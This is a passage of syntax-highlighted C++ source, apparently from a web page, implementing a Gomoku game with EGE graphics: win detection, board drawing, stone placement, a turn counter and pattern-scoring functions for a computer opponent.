class=\"number\">0</span>; p &lt; <span class=\"number\">5</span>; p++)</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (pos[i][j] != pos[i][j + p])</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tflag = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (flag)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tline(i * <span class=\"number\">40</span> + <span class=\"number\">80</span>, j * <span class=\"number\">40</span>, i * <span class=\"number\">40</span> + <span class=\"number\">80</span>, (j + <span class=\"number\">4</span>) * <span class=\"number\">40</span>);</span><br><span class=\"line\">\t\t\t\t\tEnd(pos[i][j]);</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\tflag = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> p = <span class=\"number\">0</span>; p &lt; <span class=\"number\">5</span>; p++)</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (pos[i][j] != pos[i + p][j + p])</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tflag = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (flag)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tline(i * <span class=\"number\">40</span> + <span class=\"number\">80</span>, j * <span class=\"number\">40</span>, (i + <span class=\"number\">4</span>) * <span class=\"number\">40</span> + <span class=\"number\">80</span>, (j + <span class=\"number\">4</span>) * <span class=\"number\">40</span>);</span><br><span class=\"line\">\t\t\t\t\tEnd(pos[i][j]);</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\tflag = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> p = <span class=\"number\">0</span>; p &lt; <span class=\"number\">5</span>; p++)</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (pos[i][j] != pos[i + p][j])</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tflag = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (flag)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tline(i * <span class=\"number\">40</span> + <span class=\"number\">80</span>, j * <span class=\"number\">40</span>, (i + <span class=\"number\">4</span>) * <span class=\"number\">40</span> + <span class=\"number\">80</span>, j * <span class=\"number\">40</span>);</span><br><span class=\"line\">\t\t\t\t\tEnd(pos[i][j]);</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">5</span>; i &lt;= <span class=\"number\">15</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">12</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pos[i][j])</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">bool</span> flag = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> p = <span class=\"number\">0</span>; p &lt; <span class=\"number\">5</span>; p++)</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">if</span> (pos[i][j] != pos[i - p][j + p])</span><br><span class=\"line\">\t\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t\tflag = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (flag)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\tline(i * <span class=\"number\">40</span> + <span class=\"number\">80</span>, j * <span class=\"number\">40</span>, (i - <span class=\"number\">4</span>) * <span class=\"number\">40</span> + <span class=\"number\">80</span>, (j + <span class=\"number\">4</span>) * <span class=\"number\">40</span>);</span><br><span class=\"line\">\t\t\t\t\tEnd(pos[i][j]);</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ChessBoard</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsetbkcolor(EGERGB(<span class=\"number\">199</span>, <span class=\"number\">156</span>, <span class=\"number\">124</span>));</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">120</span>; i &lt;= <span class=\"number\">680</span>; i += <span class=\"number\">40</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tline(<span class=\"number\">120</span>, i - <span class=\"number\">80</span>, <span class=\"number\">680</span>, i - <span class=\"number\">80</span>);\t<span class=\"comment\">//X\t120-680</span></span><br><span class=\"line\">\t\tline(i, <span class=\"number\">40</span>, i, <span class=\"number\">600</span>);\t\t\t<span class=\"comment\">//Y\t40-600</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tsetfillcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\tbar(<span class=\"number\">240</span> - <span class=\"number\">4</span>, <span class=\"number\">160</span> - <span class=\"number\">4</span>, <span class=\"number\">240</span> + <span class=\"number\">4</span>, <span class=\"number\">160</span> + <span class=\"number\">4</span>);</span><br><span class=\"line\">\tbar(<span class=\"number\">240</span> - <span class=\"number\">4</span>, <span class=\"number\">480</span> - <span class=\"number\">4</span>, <span class=\"number\">240</span> + <span class=\"number\">4</span>, <span class=\"number\">480</span> + <span class=\"number\">4</span>);</span><br><span class=\"line\">\tbar(<span class=\"number\">560</span> - <span class=\"number\">4</span>, <span class=\"number\">160</span> - <span class=\"number\">4</span>, <span class=\"number\">560</span> + <span class=\"number\">4</span>, <span class=\"number\">160</span> + <span class=\"number\">4</span>);</span><br><span class=\"line\">\tbar(<span class=\"number\">560</span> - <span class=\"number\">4</span>, <span class=\"number\">480</span> - <span class=\"number\">4</span>, <span class=\"number\">560</span> + <span class=\"number\">4</span>, <span class=\"number\">480</span> + <span class=\"number\">4</span>);</span><br><span class=\"line\">\tbar(<span class=\"number\">400</span> - <span class=\"number\">4</span>, <span class=\"number\">320</span> - <span class=\"number\">4</span>, <span class=\"number\">400</span> + <span class=\"number\">4</span>, <span class=\"number\">320</span> + <span class=\"number\">4</span>);</span><br><span class=\"line\">\tsetfont(<span class=\"number\">10</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;黑体&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">40</span>; i &lt;= <span class=\"number\">600</span>; i += <span class=\"number\">40</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\txyprintf(<span class=\"number\">100</span>, i - <span class=\"number\">3</span>, <span class=\"string\">&quot;%d&quot;</span>, (<span class=\"keyword\">int</span>)(i / <span class=\"number\">40</span>));</span><br><span class=\"line\">\t\txyprintf(i + <span class=\"number\">78</span>, <span class=\"number\">20</span>, <span class=\"string\">&quot;%c&quot;</span>, (<span class=\"keyword\">char</span>)(i / <span class=\"number\">40</span> + <span class=\"string\">&#x27;A&#x27;</span> - <span class=\"number\">1</span>));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\tsetfont(<span class=\"number\">20</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;宋体&quot;</span>);</span><br><span class=\"line\">\txyprintf(<span class=\"number\">10</span>, <span class=\"number\">40</span>, <span class=\"string\">&quot;当前子数&quot;</span>);</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\txyprintf(<span class=\"number\">10</span>, <span class=\"number\">70</span>, <span class=\"string\">&quot;黑: 0&quot;</span>);</span><br><span class=\"line\">\tsetcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>));</span><br><span class=\"line\">\txyprintf(<span class=\"number\">10</span>, <span class=\"number\">100</span>, <span class=\"string\">&quot;白: 0&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Chess</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y, <span class=\"keyword\">int</span> color)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (color % <span class=\"number\">2</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tsetcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>));</span><br><span class=\"line\">\t\tsetfillcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>));</span><br><span class=\"line\">\t\tfillellipse(x, y, <span class=\"number\">15</span>, <span class=\"number\">15</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tsetcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\t\tsetfillcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\t\tfillellipse(x, y, <span class=\"number\">15</span>, <span class=\"number\">15</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">Play</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y, <span class=\"keyword\">int</span> color)</span><span class=\"comment\">//color: 0●  1○</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tx -= <span class=\"number\">2</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (x &gt;= <span class=\"number\">1</span> &amp;&amp; x &lt;= <span class=\"number\">15</span> &amp;&amp; y &gt;= <span class=\"number\">1</span> &amp;&amp; y &lt;= <span class=\"number\">15</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!pos[x][y])</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tChess(x * <span class=\"number\">40</span> + <span class=\"number\">80</span>, y * <span class=\"number\">40</span>, color);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (color)pos[x][y] = <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> pos[x][y] = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Counter</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tsetfillcolor(EGERGB(<span class=\"number\">199</span>, <span class=\"number\">156</span>, <span class=\"number\">124</span>));</span><br><span class=\"line\">\tbar(<span class=\"number\">50</span>, <span class=\"number\">60</span>, <span class=\"number\">70</span>, <span class=\"number\">120</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (n % <span class=\"number\">2</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tsetcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\t\txyprintf(<span class=\"number\">50</span>, <span class=\"number\">70</span>, <span class=\"string\">&quot;%d&quot;</span>, (n + <span class=\"number\">1</span>) / <span class=\"number\">2</span>);</span><br><span class=\"line\">\t\tsetcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>));</span><br><span class=\"line\">\t\txyprintf(<span class=\"number\">50</span>, <span class=\"number\">100</span>, <span class=\"string\">&quot;%d&quot;</span>, n / <span class=\"number\">2</span>);</span><br><span class=\"line\">\t\tbar(<span class=\"number\">0</span>, <span class=\"number\">140</span>, <span class=\"number\">100</span>, <span class=\"number\">180</span>);</span><br><span class=\"line\">\t\txyprintf(<span class=\"number\">10</span>, <span class=\"number\">150</span>, <span class=\"string\">&quot;白方执棋&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tsetcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\t\txyprintf(<span class=\"number\">50</span>, <span class=\"number\">70</span>, <span class=\"string\">&quot;%d&quot;</span>, n / <span class=\"number\">2</span>);</span><br><span class=\"line\">\t\tsetcolor(EGERGB(<span class=\"number\">255</span>, <span class=\"number\">255</span>, <span class=\"number\">255</span>));</span><br><span class=\"line\">\t\txyprintf(<span class=\"number\">50</span>, <span class=\"number\">100</span>, <span class=\"string\">&quot;%d&quot;</span>, (n + <span class=\"number\">1</span>) / <span class=\"number\">2</span>);</span><br><span class=\"line\">\t\tbar(<span class=\"number\">0</span>, <span class=\"number\">140</span>, <span class=\"number\">100</span>, <span class=\"number\">180</span>);</span><br><span class=\"line\">\t\tsetcolor(EGERGB(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">\t\txyprintf(<span class=\"number\">10</span>, <span class=\"number\">150</span>, <span class=\"string\">&quot;黑方执棋&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">lian5</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>, flag1 = <span class=\"number\">0</span>, flag2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">5</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> flag1 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> flag2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (ans &gt;= <span class=\"number\">4</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == <span class=\"number\">1</span>)black[x][y] += <span class=\"number\">100</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> white[x][y] += <span class=\"number\">100</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">live4</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>, a = <span class=\"number\">1</span>, b = <span class=\"number\">1</span>, flag1 = <span class=\"number\">0</span>, flag2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">5</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\ta = <span class=\"number\">0</span>, flag1 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\tb = <span class=\"number\">0</span>, flag2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ((ans &gt;= <span class=\"number\">3</span>) &amp;&amp; !a &amp;&amp; !b)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == <span class=\"number\">1</span>)black[x][y] += <span class=\"number\">80</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> white[x][y] += <span class=\"number\">80</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">chong4</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>, a = <span class=\"number\">1</span>, b = <span class=\"number\">1</span>, flag1 = <span class=\"number\">0</span>, flag2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">5</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\ta = <span class=\"number\">0</span>, flag1 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag2 &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x - j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y - j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x - j * dir[i][<span class=\"number\">0</span>]][y - j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\tb = <span class=\"number\">0</span>, flag2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ((ans &gt;= <span class=\"number\">3</span>) &amp;&amp; (a || b) &amp;&amp; (a != b))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == <span class=\"number\">1</span>)black[x][y] += <span class=\"number\">60</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> white[x][y] += <span class=\"number\">60</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">live3</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>, a = <span class=\"number\">1</span>, b = <span class=\"number\">1</span>, flag1 = <span class=\"number\">0</span>, flag2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">4</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!flag1 &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (x + j * dir[i][<span class=\"number\">0</span>] &lt; <span class=\"number\">16</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &gt; <span class=\"number\">0</span>) &amp;&amp; (y + j * dir[i][<span class=\"number\">1</span>] &lt; <span class=\"number\">16</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (pos[x][y] == pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]])</span><br><span class=\"line\">\t\t\t\t\tans++;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (pos[x + j * dir[i][<span class=\"number\">0</span>]][y + j * dir[i][<span class=\"number\">1</span>]] == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\t\ta = <span class=\"number\">0</span>, flag1 = <span class=\"number\">1</span>;</span><br><span 